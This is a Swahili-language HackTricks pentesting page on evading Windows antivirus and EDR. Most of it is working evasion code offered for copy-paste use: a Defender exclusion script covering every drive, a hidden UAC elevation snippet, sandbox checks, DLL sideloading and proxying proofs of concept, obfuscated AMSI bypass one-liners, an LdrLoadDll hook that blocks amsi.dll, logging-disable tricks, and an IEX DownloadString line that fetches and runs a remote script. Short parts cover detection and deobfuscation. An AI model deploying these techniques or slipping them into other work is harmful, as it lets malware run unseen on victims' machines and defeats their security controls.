# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Kusimamisha Defender

- [defendnot](https://github.com/es3n1n/defendnot): Tool ya kusimamisha Windows Defender kufanya kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Tool ya kusimamisha Windows Defender kwa kujifanya kuwa AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Ujanja wa UAC wa aina ya Installer kabla ya kuingilia Defender

Public loaders zinazojifanya kuwa game cheats mara nyingi husambazwa kama unsigned Node.js/Nexe installers ambazo kwanza **humwomba mtumiaji ruhusa za elevation**, kisha hudhoofisha Defender. Mchakato ni rahisi:

1. Kagua kama kuna muktadha wa administrative kwa kutumia `net session`. Command hii hufaulu tu caller akiwa na admin rights, kwa hivyo kushindwa kwake kunaonyesha kuwa loader inaendeshwa na standard user.
2. Ijiendeshe upya mara moja kwa kutumia verb ya `RunAs` ili kuanzisha UAC consent prompt inayotarajiwa huku ikihifadhi command line ya awali.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathiriwa tayari wanaamini kuwa wanasakinisha software ya “cracked”, hivyo ombi hilo kwa kawaida hukubaliwa, na kuipa malware ruhusa inayohitaji kubadilisha policy ya Defender.<sup>[[26]](#references)</sup>

### `MpPreference` exclusions za jumla kwa kila herufi ya drive

Baada ya kupata mamlaka yaliyoinuliwa, chains za mtindo wa GachiLoader huongeza blind spots za Defender badala ya kuzima service moja kwa moja. Loader kwanza huua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha kusukuma **exclusions pana kupita kiasi**, ili kila user profile, system directory, na removable disk isiweze kuchanganuliwa:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Loop inapitia kila filesystem iliyomountiwa (D:\, E:\, USB sticks, n.k.), kwa hiyo **payload yoyote ya baadaye itakayotupwa mahali popote kwenye disk itapuuzwa**.
- Kutengwa kwa extension ya `.sys` kunaangalia mbeleni—attackers wanahifadhi chaguo la kupakia unsigned drivers baadaye bila kugusa Defender tena.
- Mabadiliko yote yanawekwa chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo stages zinazofuata zinaweza kuthibitisha kuwa exclusions zinaendelea kuwepo au kuzipanua bila ku-trigger UAC tena.

Kwa sababu hakuna Defender service iliyosimamishwa, health checks rahisi zinaendelea kuripoti “antivirus active” ingawa real-time inspection haigusi paths hizo.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia methods tofauti kuangalia kama file ni malicious au la: static detection, dynamic analysis, na kwa EDRs zilizo advanced zaidi, behavioural analysis.

### **Static detection**

Static detection hupatikana kwa ku-flag strings zinazojulikana kuwa malicious au arrays za bytes ndani ya binary au script, na pia kutoa taarifa kutoka kwenye file lenyewe (k.m. file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kuwa kutumia public tools zinazojulikana kunaweza kukufanya ukubaliwe kwa urahisi zaidi, kwa sababu huenda tayari zimechambuliwa na ku-flagged kuwa malicious. Kuna njia kadhaa za kukwepa aina hii ya detection:

- **Encryption**

Uki-encrypt binary, AV haitakuwa na njia ya kugundua program yako, lakini utahitaji aina fulani ya loader ya ku-decrypt na ku-run program hiyo kwenye memory.

- **Obfuscation**

Wakati mwingine unachohitaji kufanya ni kubadilisha strings fulani kwenye binary au script yako ili ipite AV, lakini hii inaweza kuchukua muda kulingana na unachojaribu ku-obfuscate.

- **Custom tooling**

Ukitengeneza tools zako mwenyewe, hakutakuwa na known bad signatures, lakini hii huchukua muda na juhudi nyingi.

> [!TIP]
> Njia nzuri ya ku-check dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawanya file katika segments nyingi, kisha huagiza Defender ku-scan kila moja kivyake; kwa njia hii, inaweza kukuonyesha strings au bytes zilizoflagiwa kwenye binary yako.

Ninapendekeza sana uangalie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) hii kuhusu practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis ni wakati AV ina-run binary yako kwenye sandbox na kuangalia shughuli za malicious (k.m. kujaribu ku-decrypt na kusoma passwords za browser yako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kufanya kazi nayo, lakini hapa kuna baadhi ya mambo unayoweza kufanya ili kukwepa sandboxes.

- **Sleep kabla ya execution** Kulingana na jinsi ilivyotekelezwa, hii inaweza kuwa njia nzuri ya kukwepa AV's dynamic analysis. AVs zina muda mfupi sana wa ku-scan files ili zisitatishe workflow ya mtumiaji, kwa hiyo kutumia sleeps ndefu kunaweza kuvuruga analysis ya binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka sleep hiyo kulingana na jinsi ilivyotekelezwa.
- **Ku-check resources za machine** Kwa kawaida, Sandboxes zina resources chache sana za kutumia (k.m. < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya machine ya mtumiaji. Unaweza pia kuwa creative sana hapa, kwa mfano ku-check temperature ya CPU au hata fan speeds; si kila kitu kitakuwa kimeimplementiwa kwenye sandbox.
- **Machine-specific checks** Ikiwa unataka kumlenga mtumiaji ambaye workstation yake imejiunga na domain ya `"contoso.local"`, unaweza ku-check domain ya computer ili kuona kama inalingana na uliyobainisha; ikiwa hailingani, unaweza kufanya program yako itoke.

Imebainika kuwa computername ya Microsoft Defender's Sandbox ni HAL9TH, kwa hiyo unaweza ku-check computer name kwenye malware yako kabla ya detonation; jina likiwa HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Baadhi ya tips nyingine nzuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) za kukabiliana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema awali kwenye post hii, **public tools** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujiuliza jambo moja:

Kwa mfano, ikiwa unataka kudump LSASS, **unahitaji kweli kutumia mimikatz**? Au unaweza kutumia project tofauti ambayo haijulikani sana na pia inadump LSASS.

Jibu sahihi huenda likawa la pili. Tukitumia mimikatz kama mfano, huenda ni mojawapo ya, au ikiwa si, malware iliyo-flagged zaidi na AVs na EDRs; ingawa project yenyewe ni nzuri sana, pia ni nightmare kufanya kazi nayo ili kukwepa AVs, kwa hiyo tafuta tu alternatives za kile unachojaribu kutimiza.

> [!TIP]
> Unaporekebisha payloads zako kwa ajili ya evasion, hakikisha **unazima automatic sample submission** kwenye defender, na tafadhali, kwa umakini, **USIUPLOAD KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha evasion kwa muda mrefu. Ikiwa unataka ku-check kama payload yako inagunduliwa na AV fulani, install hiyo kwenye VM, jaribu kuzima automatic sample submission, kisha i-test hapo hadi uridhike na matokeo.

## EXEs vs DLLs

Inapowezekana, kila mara **weka kipaumbele kwenye kutumia DLLs kwa evasion**; kutokana na uzoefu wangu, DLL files kwa kawaida **hugunduliwa na kuchambuliwa kwa kiwango cha chini zaidi**, kwa hiyo hii ni trick rahisi sana ya kusaidia kuepuka detection katika baadhi ya cases (ikiwa payload yako ina njia fulani ya ku-run kama DLL, bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 kwenye antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>ulinganisho wa antiscan.me kati ya Havoc EXE payload ya kawaida dhidi ya Havoc DLL ya kawaida</p></figcaption></figure>

Sasa tutaonyesha tricks kadhaa unazoweza kutumia na DLL files ili ziwe stealthier zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia fursa ya DLL search order inayotumiwa na loader kwa kuweka victim application na malicious payload(s) pamoja.

Unaweza ku-check programs zinazoweza kuathiriwa na DLL Sideloading ukitumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programs zilizo hatarini kwa DLL hijacking ndani ya "C:\Program Files\\" pamoja na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programs za DLL Hijackable/Sideloadable**, mbinu hii ni stealthy sana ikifanywa ipasavyo, lakini ukitumia programs za DLL Sideloadable zinazojulikana hadharani, unaweza kugunduliwa kwa urahisi.

Kuweka tu DLL hasidi yenye jina ambalo program inatarajia kupakia hakutapakia payload yako, kwa sababu program inatarajia functions maalum ndani ya DLL hiyo. Ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** hu-forward calls ambazo program hufanya kutoka kwenye DLL ya proxy (na hasidi) kwenda kwenye DLL asili, hivyo kuhifadhi utendaji wa program na kuwezesha kushughulikia execution ya payload yako.

Nitatumia project ya [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: template ya source code ya DLL, na DLL ya awali iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu (iliyowekwa encoding kwa [SGN](https://github.com/EgeBalci/sgn)) pamoja na proxy DLL zilikuwa na kiwango cha Detection cha 0/26 katika [antiscan.me](https://antiscan.me)! Naweza kusema huo ni ufanisi.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Ninapendekeza sana** utazame [twitch VOD ya S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading, pamoja na [video ya ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), ili ujifunze zaidi kwa kina kuhusu tulichojadili.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, export entry huwa na ASCII string ya muundo `TargetDll.TargetFunc`. Caller anapotatua export hiyo, Windows loader itafanya yafuatayo:

- I-load `TargetDll` ikiwa bado haija-loadiwa
- Itat solve `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka protected KnownDLLs namespace (kwa mfano, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ikiwa `TargetDll` si KnownDLL, normal DLL search order hutumika, ikijumuisha directory ya module inayofanya forward resolution.

Hii huwezesha indirect sideloading primitive: tafuta signed DLL inayofanya export ya function iliyo-forwardiwa kwenye jina la module isiyo ya KnownDLL, kisha iweke signed DLL hiyo pamoja na DLL inayodhibitiwa na attacker yenye jina linalolingana kabisa na forwarded target module. Forwarded export inapoitwa, loader hutatua forward hiyo na ku-load DLL yako kutoka directory hiyo hiyo, kisha kutekeleza DllMain yako.<sup>[[13]](#references)</sup>

Mfano ulioonekana kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, kwa hivyo inatatuliwa kupitia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyosainiwa hadi kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` hasidi katika folda hiyo hiyo. DllMain ya msingi inatosha kupata code execution; huhitaji kutekeleza forwarded function ili kuchochea DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Anzisha forward kwa kutumia LOLBin iliyosainiwa:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Tabia iliyozingatiwa:
- rundll32 (signed) hupakia `keyiso.dll` ya side-by-side (signed)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" baada tu ya `DllMain` kuwa tayari imeendeshwa

Vidokezo vya hunting:
- Lenga forwarded exports ambapo module lengwa si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa kutumia zana kama vile:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama inventory ya Windows 11 forwarder ili kutafuta candidates: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Mawazo ya detection/defense:
- Fuatilia LOLBins (mfano, rundll32.exe) zinapopakia DLL zilizotiwa saini kutoka kwenye paths zisizo za mfumo, kisha kupakia non-KnownDLLs zenye base name ileile kutoka kwenye directory hiyo
- Toa alert kwa process/module chains kama: `rundll32.exe` → `keyiso.dll` isiyo ya mfumo → `NCRYPTPROV.dll` chini ya paths zinazoweza kuandikwa na mtumiaji
- Tekeleza sera za code integrity (WDAC/AppLocker) na kataza write+execute katika application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ni payload toolkit ya kubypass EDRs kwa kutumia suspended processes, direct syscalls, na alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya stealth.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya; kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee tool moja pekee, ikiwezekana jaribu kuchanganya mbinu nyingi za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs mara nyingi huweka **user-mode inline hooks** kwenye syscall stubs za `ntdll.dll`. Ili kupita hooks hizo, unaweza kutengeneza syscall stubs za **direct** au **indirect** zinazopakia **SSN** (System Service Number) sahihi na kuingia kernel mode bila kutekeleza hooked export entrypoint.<sup>[[32]](#references)</sup>

**Chaguo za invocation:**
- **Direct (embedded)**: weka instruction ya `syscall`/`sysenter`/`SVC #0` kwenye stub inayotengenezwa (hakuna hit kwenye `ntdll` export).
- **Indirect**: ruka hadi kwenye syscall gadget iliyopo ndani ya `ntdll` ili kernel transition ionekane kana kwamba imetoka `ntdll` (ni muhimu kwa heuristic evasion); **randomized indirect** huchagua gadget kutoka kwenye pool kwa kila call.
- **Egg-hunt**: epuka kuweka static `0F 05` opcode sequence kwenye disk; tafuta syscall sequence wakati wa runtime.

**Mikakati ya hook-resistant SSN resolution:**
- **FreshyCalls (VA sort)**: kadiria SSNs kwa kupanga syscall stubs kulingana na virtual address badala ya kusoma stub bytes.
- **SyscallsFromDisk**: map `\KnownDlls\ntdll.dll` iliyo safi, soma SSNs kutoka kwenye `.text` yake, kisha unmapp (hupita hooks zote za memory).
- **RecycledGate**: unganisha VA-sorted SSN inference na opcode validation wakati stub iko safi; ikiwa imehookiwa, tumia VA inference.
- **HW Breakpoint**: weka DR0 kwenye instruction ya `syscall` na utumie VEH kunasa SSN kutoka `EAX` wakati wa runtime, bila kuchanganua hooked bytes.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AVs ziliweza kuchanganua **files zilizo kwenye disk** pekee, kwa hiyo kama ungeweza kutekeleza payloads **moja kwa moja kwenye memory**, AV isingeweza kufanya chochote kuizuia, kwa kuwa haikuwa na visibility ya kutosha.

Kipengele cha AMSI kimeunganishwa kwenye components hizi za Windows.

- User Account Control, au UAC (kuinua ruhusa za EXE, COM, MSI, au usakinishaji wa ActiveX)
- PowerShell (scripts, matumizi ya interactive, na dynamic code evaluation)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Huruhusu antivirus solutions kukagua script behavior kwa kufichua script contents katika hali ambayo haina encryption wala obfuscation.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha alert ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyoweka `amsi:` mwanzoni, kisha path ya executable ambayo script iliendeshwa kutoka humo, katika hali hii, powershell.exe

Hatukuacha file lolote kwenye disk, lakini bado tulikamatwa kwenye memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code pia hupitishwa kupitia AMSI. Hii inaathiri hata `Assembly.Load(byte[])` kwa ajili ya kupakia in-memory execution. Ndiyo sababu kutumia versions za chini za .NET (kama 4.7.2 au chini) kunapendekezwa kwa in-memory execution ikiwa unataka kukwepa AMSI.

Kuna njia kadhaa za kuzunguka AMSI:

- **Obfuscation**

Kwa kuwa AMSI hufanya kazi hasa kwa static detections, kubadilisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kukwepa detection.

Hata hivyo, AMSI ina uwezo wa ku-unobfuscate scripts hata ikiwa zina layers nyingi, kwa hiyo obfuscation inaweza kuwa chaguo baya kulingana na jinsi inavyofanywa. Hii hufanya kuikwepa isiwe rahisi moja kwa moja. Ingawa, wakati mwingine, unachohitaji kufanya ni kubadilisha majina machache ya variables na utakuwa salama, kwa hiyo inategemea kiwango ambacho kitu kime-flagged.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL ndani ya process ya powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuichezea kwa urahisi hata ukiendesha kama unprivileged user. Kwa sababu ya dosari hii katika implementation ya AMSI, researchers wamegundua njia nyingi za kukwepa AMSI scanning.

**Forcing an Error**

Kulazimisha AMSI initialization ishindwe (`amsiInitFailed`) kutasababisha scan kutoanzishwa kwa process ya sasa. Hili lilifichuliwa awali na [Matt Graeber](https://twitter.com/mattifestation), na Microsoft imeunda signature ya kuzuia matumizi yake kwa upana zaidi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua tu mstari mmoja wa powershell code kuifanya AMSI isitumikie tena kwa powershell process ya sasa. Bila shaka, mstari huu umegunduliwa na AMSI yenyewe, hivyo marekebisho fulani yanahitajika ili kutumia technique hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyoichukua kutoka kwenye [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Technique hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta address ya function ya "AmsiScanBuffer" katika amsi.dll (inayohusika na kuchanganua input iliyotolewa na mtumiaji) na kui-overwrite kwa instructions za kurudisha code ya E_INVALIDARG; kwa njia hii, matokeo ya scan halisi yatarudisha 0, ambayo hutafsiriwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Pia kuna techniques nyingine nyingi zinazotumiwa kubypass AMSI kwa powershell; angalia [**ukurasa huu**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**repo hii**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Kuzuia AMSI kwa kuzuia amsi.dll kupakiwa (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa katika process ya sasa. Bypass thabiti isiyohusishwa na lugha yoyote ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` ambayo hurudisha error wakati module iliyoombwa ni `amsi.dll`. Kwa matokeo hayo, AMSI haipakwi kamwe na hakuna scans zinazofanyika kwa process hiyo.<sup>[[23]](#references)</sup>

Muhtasari wa implementation (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Hufanya kazi katika PowerShell, WScript/CScript na custom loaders kwa pamoja (kitu chochote ambacho vinginevyo kingepakia AMSI).
- Iunganishe na kupeleka scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka command-line artefacts ndefu.
- Imeonekana ikitumika na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kubypass AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kubypass AMSI inayokwepa signature kwa kutumia function, variables na character expression zilizobainishwa na mtumiaji na kubadilisha kwa nasibu herufi kubwa na ndogo katika keywords za PowerShell ili kuepuka signature.

**Ondoa signature iliyogunduliwa**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa signature ya AMSI iliyogunduliwa kutoka kwenye memory ya process ya sasa. Tool hii hufanya kazi kwa kuchanganua memory ya process ya sasa kutafuta signature ya AMSI, kisha kuiandikia instructions za NOP, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia Powershell version 2**
Ukitumia PowerShell version 2, AMSI haitapakiwa, kwa hiyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuruhusu kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa muhimu kwa madhumuni ya auditing na troubleshooting, lakini pia inaweza kuwa **tatizo kwa attackers wanaotaka kukwepa detection**.

Ili kupita PowerShell logging, unaweza kutumia techniques zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia tool kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) ku-host PowerShell bila kuanzisha `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa controls zinazohusishwa mahususi na process ya `powershell.exe`, lakini hai-disable AMSI, Script Block Logging, au kila defense nyingine ya PowerShell moja kwa moja; coverage hutegemea runtime na implementation ya host.


## Obfuscation

> [!TIP]
> Techniques kadhaa za obfuscation hutegemea encrypting data, jambo linaloongeza entropy ya binary na kurahisisha AVs na EDRs kuigundua. Kuwa mwangalifu na hili, na huenda ukahitaji kutumia encryption kwenye sections maalum tu za code yako ambazo ni sensitive au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Unapochanganua malware inayotumia ConfuserEx 2 (au commercial forks), ni kawaida kukutana na layers kadhaa za protection ambazo zitazuia decompilers na sandboxes. Workflow iliyo hapa chini hurejesha kwa uaminifu **IL inayokaribia ya awali**, ambayo baadaye inaweza ku-decompile kuwa C# kwa kutumia tools kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Kuondoa anti-tampering – ConfuserEx hu-encrypt kila *method body* na kui-decrypt ndani ya *module* static constructor (`<Module>.cctor`). Pia hubadilisha PE checksum ili modification yoyote isababishe binary ku-crash. Tumia **AntiTamperKiller** kutafuta encrypted metadata tables, kurejesha XOR keys na kuandika assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output huwa na anti-tamper parameters 6 (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa muhimu wakati wa kutengeneza unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – pitisha file *safi* kwenye **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua ConfuserEx 2 profile
• de4dot itaondoa control-flow flattening, kurejesha namespaces, classes na variable names za awali, na ku-decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx hubadilisha direct method calls na wrappers nyepesi (zinazojulikana pia kama *proxy calls*) ili kuzuia zaidi decompilation. Ziondoe kwa kutumia **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii, unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions zisizoeleweka (`Class8.smethod_10`, …).

